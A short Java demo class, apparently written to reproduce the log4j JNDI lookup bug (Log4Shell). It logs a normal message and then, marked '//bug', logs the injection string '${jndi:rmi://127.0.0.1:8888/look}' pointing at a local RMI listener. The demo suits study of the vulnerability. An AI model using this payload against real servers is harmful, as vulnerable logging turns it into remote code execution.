package com.hz.yk.log4j.bug;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author wuzheng.yk
 * @date 2022/8/27
 */
public class LogMain {
    static Logger logger = LoggerFactory.getLogger("abc");

    public static void main(String[] args) {
        //
        logger.info("this is a {}", "dog");
        //bug
        logger.info("user {} regiester ok","${jndi:rmi://127.0.0.1:8888/look}");
    }
}
